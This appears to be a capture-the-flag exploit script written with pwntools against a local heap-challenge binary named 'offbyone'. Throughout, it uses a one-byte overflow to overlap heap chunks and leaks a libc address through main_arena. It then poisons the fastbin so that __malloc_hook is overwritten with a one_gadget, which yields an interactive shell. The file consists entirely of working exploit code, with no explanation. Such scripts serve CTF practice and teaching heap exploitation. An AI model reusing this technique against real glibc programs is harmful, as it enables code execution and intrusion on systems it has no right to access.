from pwn import *

def add(size,note):
	p.sendlineafter(">> ","1")
	p.sendlineafter("length: ",str(size))
	p.sendafter("note:",note)

def edit(index,note):
	p.sendlineafter(">> ","2")
	p.sendlineafter("index: ",str(index))
	p.sendafter("note:",note)

def delete(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("index: ",str(index))

def show(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("index: ",str(index))




libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=process('./offbyone')

add(0x28,'a'*0x28)#0
add(0xf8,'a'*0xf8)#1
add(0x68,'a'*0x68)#2
add(0x60,'a'*0x60)#3
add(0x60,'a'*0x60)#4

#gdb.attach(p)
#raw_input()
delete(1)#chunk 1 will in unsorted bins
edit(0,'a'*0x28+'\x71')#change chunk1's size
edit(2,'a'*0x60+p64(0x170)+'\x70')#set chunk3's prev_size and precv_inuse

add(0xf8,'a'*0xf8)

show(2)
main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
print hex(main_arena)

libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
print hex(libc_base)

system=libc_base+libc.symbols['system']
print "system",hex(system)


malloc_hook=libc_base+libc.symbols['__malloc_hook']


one_gadget=libc_base+0xf02a4

add(0x60,'a'*0x60)#5 == 2

delete(3)
delete(2)
edit(5,p64(malloc_hook-0x10-3)[0:6])

add(0x60,'/bin/sh\x00'+'a'*0x58)#2
add(0x60,'a'*3+p64(one_gadget)+'\n')
delete(2)
delete(5)

p.interactive()
